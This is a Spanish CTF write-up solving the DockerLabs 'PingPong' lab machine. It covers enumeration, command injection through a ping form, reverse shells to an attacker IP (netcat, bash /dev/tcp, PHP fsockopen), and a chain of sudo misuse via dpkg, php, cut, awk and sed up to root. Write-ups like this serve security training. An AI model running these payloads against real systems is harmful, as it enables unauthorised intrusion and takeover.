---
title: "Write-up PingPong DockerLabs"
description: "Guia completa paso a paso de como resolver la maquina PingPong de la plataforma DockerLabs."
date: 2026-03-06
creator: "El Pinguino de Mario"
rating: 4.9
dificultad: "Medio"
author: "Ghxstsec"
draft: false
type: "post"
---

Write-Up máquina PingPong de DockerLabs [ES]
==============================================

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*OjohNyuCqnmWs3KMWcDTjw.png)

Bueno, por aquí os dejo mi write-up de la máquina “Ping Pong” de la plataforma DockerLabs, Creada por “El Pingüino de Mario”

Reconocimiento Inicial Y Enumeración
------------------------------------

Yo normalmente comienzo efectuando un escaneo de puertos a la IP principal, para ver qué puertos tiene abiertos, me da este resultado:

```
sudo nmap -p- -Pn -n -sCV -min-rate 5000 -T5 -oN targeted -v 172.17.0.2
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*W5TffDvMaiPp6jagbiGyFw.png)

Podemos ver varios tipos de web:

Puerto 80: Web HTTP, sin SSL, solo se puede ver un manual de apache, nada interesante

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*04pJeza_W3UCbKIq81r7Xg.png)

Podemos fuzzear subdirectorios para ver si nos lleva a alguna cosa interesante:

```
gobuster dir -u http://172.17.0.2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_OWR6njDxBH8cUgAIgORoQ.png)

Nada, interesante, el directorio JavaScript no arroja nada importante

Vamos a por el siguiente puerto:

443 SSL/http Apache httpd 2.4.58 ((Ubuntu))

Exactamente, lo mismo, no tiene nada importante.

5000 Werkzeug httpd 3.0.1 (Python 3.12.3)

Aquí sí que hay algo más interesante…

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qFHJ2vVvmds1h9sINCB7Ig.png)

ACCESO INICIAL, ESCALADA DE FREDDY A BOBBY
------------------------------------------

Podemos ver un panel, con un input para poner IP address, en todo caso que este panel no este sanitizado, podríamos ejecutar una “Concatenación de comandos” en una Shell en la máquina víctima: vamos a ver que tan bien está este panel:

![captionless image](https://miro.medium.com/v2/resize:fit:940/format:webp/1*Zgsr4tE7_0IGHv3eBzHcdw.png)

Podemos ver que nos devuelve el mismo output que si ejecutamos un ping en una máquina Linux:

![captionless image](https://miro.medium.com/v2/resize:fit:1002/format:webp/1*GLgxQy_glVE1GlCmc_RMxA.png)

El concatenador más común en Linux es el semicolon, o punto y coma (;)

si probamos el típico comando “id” después de la concatenación podremos ver algo bastante interesante:

![captionless image](https://miro.medium.com/v2/resize:fit:1042/format:webp/1*VVZH75H8C32Rr1ulnWcNaA.png)

tenemos **Inyección de comandos en la máquina víctima**

Probando varias reverse Shell como:

```
nc 172.17.0.1 9001 -e /bin/bash
busybox nc 172.17.0.1 -e /bin/bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.17.0.1 9001 >/tmp/f
```

Me doy cuenta de que no tenemos el binario netcat, ni curl, ni wget, ósea, hay que hacer la reverse shell con bash, de esta manera:

```
bash -c 'bash -i &>/dev/tcp/172.17.0.1/9002 <&1'
```

Así que pongámoslo a prueba:

Iniciamos el listener con cualquier Shell handler de nuestro gusto en la máquina atacante (netcat, penelope, socat):

![E](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*5OYiDvuCAVX5hF2AMJ11AA.png)

Ejecutamos el comando concatenado en la web y…

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*zxgMwR250kmvf2AIDlV3rA.png)

Estamos como el usuario Freddy, miramos por algunos binarios y nos encontramos con esto:

![captionless image](https://miro.medium.com/v2/resize:fit:574/format:webp/1*o1ZG3NpvD1qg6-XKGK4qMQ.png)

No podemos subir ni LinPeas, ni LinEnum, ningún exploit desde nuestra máquina, así que pienso que la enumeración en la escalada de privilegios será manual, y bastante fácil…

Primero probamos con el típico comando sudo:

```
Sudo -l
```

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*43IQclbLvlWorNRJXRbmsw.png)

¡Upa! Tenemos sudo en el binario **dpkg**, en el usuario “Bobby”, miramos en [**gtfobins**](https://gtfobins.org/gtfobins/dpkg/) el binario **dpkg:**

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MBXUbGGc81_noiSjygKXkA.png)

Mmmhhh… no me interesa, porque no tenemos el comando fpm, vamos a usar el método de “List packages”, será de esta forma:

Ejecutaremos el comando “dpkg -l” con el usuario Bobby:

![captionless image](https://miro.medium.com/v2/resize:fit:746/format:webp/1*QO-L_nJ4lwPQo_pC5UrqtA.png)

Veremos este resultado: ( o algo asi )

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Gd7CeOUZyBM5wQRLu2v4Xw.png)

¿Abajo veremos el “ — more — “, ahí se pueden ejecutar comandos, de qué manera? Pues con el símbolo de exclamación, ejecutaremos una bash de esta manera:

```
!/bin/bash
```

(Lo suyo seria escribirlo a mano)

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*sGQtbbPIc0x1XhzRMc88Xg.png)

¡Veremos que tenemos acceso con el usuario Bobby!

BOBBY -> GLADYS
---------------

De nuevo, ejecutaremos el comando:

```
sudo -l
```

Nos dará este resultado:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*j4JN3g7ue0FNVuFIRT58Uw.png)

Tenemos acceso como sudo en el usuario “Gladys” Con el comando PHP, Os ahorrare tiempo, no probéis este comando:

```
php -r 'system("/bin/sh -i");'
```

A mí por lo menos no me ha funcionado, me crasheaba la Shell.

Probaremos ejecutando una reverse Shell a otro puerto de nuestra máquina.

```
sudo -u gladys php -r '$sock=fsockopen("TU_IP",6666);exec("/bin/sh -i <&3 >&3 2>&3");'
```

¡Recordad poner en escucha el Shell handler!

y…

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*_9dd5XAjPq0yFZcG8-6rDg.png)![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*6I_CbhouR3QKyX0ZQ1AEpA.png)

¡Tenemos Shell estable con el usuario Gladys!

Gladys -> Chocolatito
---------------------

Volvemos a ejecutar el comando:

```
sudo -l
```

Tendremos este resultado:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*12wNLRoukI3WXuT0QJvfNw.png)

Tenemos acceso sudo con el usuario chocolatito en el comando cut, ahora se complica, porque no nos podemos spawnear una Shell con un simple comando, asi que vamos a buscar archivos y carpetas con “Ownership” de chocolatito:

```
find / -user chocolatito 2>/dev/null
```

![captionless image](https://miro.medium.com/v2/resize:fit:720/format:webp/1*hcMxtohKEgbSDrdLXMLNbQ.png)

vamos al directorio y abriremos el comando cut, cuál tiene ownership de sudo por el usuario chocolatito, para leer el archivo “chocolatitocontraseña.txt”

```
cd /opt
sudo -u chocolatito cut -d "" -f1 chocolatitocontraseña.txt
```

![captionless image](https://miro.medium.com/v2/resize:fit:1388/format:webp/1*yOn5EVQz_YQ5dZQeMOkKFw.png)

Y tendremos la contraseña para el usuario chocolatito.

![captionless image](https://miro.medium.com/v2/resize:fit:622/format:webp/1*l_05c81JyFdeCHQsBl-Yxw.png)

Chocolatito -> theboss
----------------------

De nuevo, volveremos a usar el comando:

```
sudo -l
```

Con este resultado:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BcS48MUJ9yD96tWqX8WivQ.png)

buscaremos el binario **awk** en la web de [**gtfobins**](https://gtfobins.org/gtfobins/awk/)**:**

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WZ9cFZmbTvNKslruMiO9sQ.png)

Nos da el comando:

```
mawk 'BEGIN {system("/bin/sh")}'
```

Entonces nuestro comando final construido para la ejecución en el usuario theboss sería:

```
sudo -u theboss /usr/bin/awk 'BEGIN {system("/bin/sh")}'
```

con este resultado:

![captionless image](https://miro.medium.com/v2/resize:fit:1376/format:webp/1*FwHTvril3xaVzAA8XKg49g.png)

Ya tendríamos la Shell con el usuario theboss, nos estabilizaremos la Shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")' \
export TERM=xterm
```

No podemos hacer ctrl+z, pero ya se nos quedará una Shell bastante utilizable.

**theboss -> Root (por fin)**
-----------------------------

volveremos a utilizar el comando:

```
sudo -l
```

con este resultado:

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*N04PjLN3rIqmckWhuHf4Yw.png)

buscamos **sed** en [**gtfobins**](https://gtfobins.org/gtfobins/sed/):

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gmDhee1x3EOdI_M90kEssg.png)

Nos devuelve este comando:

```
sed -n '1e exec /bin/sh 1>&0' /etc/hosts
```

entonces el comando construido para ejecutarlo como root sería:

```
sudo -u root sed -n '1e exec /bin/sh 1>&0' /etc/hosts \
Ctrl + l
```

He puesto el ctrl + l en el bloque de comando con tal de limpiar la terminal por si nos hace overlap con otros comandos de la terminal.

y…

![captionless image](https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BFO2eHc0Vr36GpIIwO_CRg.png)

Y hasta aquí llego la máquina Ping Pong de DockerLabs.

Muchas gracias por leer este Write-up

¡Hasta pronto!

```
👋 Sobre el autor

¡Hola! Soy Ghxstsec (Joel Morillas), un entusiasta de la ciberseguridad y pentester. Me dedico a documentar mi viaje por el complejo mundo de la seguridad ofensiva.

Actualmente, poseo las certificaciones eJPTv2 y eCPPTv3. Mi objetivo es intentar ayudar a sobrellevar la brecha entre el aprendizaje teórico y la práctica, al tiempo que comparto mis experiencias sinceras con la comunidad. Cuando no estoy en una maratón de exámenes de 24 horas, me puedes encontrar haciendo ejercicios en Try Hack Me o investigando los últimos artículos sobre ciberseguridad.

✉️ Conéctate conmigo:

LinkedIn: [LinkedIn](https://www.linkedin.com/in/joel-morillas-aka-ghxstsec-16a988260/)
GitHub: [GitHub](https://github.com/Ghxstsec)
Twitter/X: [Twitter](https://x.com/Louikizz)
Try Hack Me: [THM](https://tryhackme.com/p/Ghxstsec)

¡Muchas gracias por leer todo el artículo! ¡Te deseo mucha suerte en tus próximos logros! 😊
